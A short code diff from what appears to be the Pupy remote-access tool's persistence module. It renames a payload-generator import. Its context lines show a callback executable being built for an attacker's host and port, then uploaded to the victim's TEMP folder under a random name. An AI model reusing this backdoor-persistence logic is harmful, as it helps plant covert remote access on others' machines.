@@ -1,7 +1,7 @@
 # -*- coding: UTF8 -*-
 from pupylib.PupyModule import *
 import random
-import genpayload
+import pupygen
 import os.path
 import string
 
@@ -27,7 +27,7 @@ class PersistenceModule(PupyModule):
 
 			self.info("generating exe ...")
 			#generating exe
-			exebuff=genpayload.get_edit_pupyx86_exe(host, port)
+			exebuff=pupygen.get_edit_pupyx86_exe(host, port)
 
 			remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
 			self.info("uploading to %s ..."%remote_path)
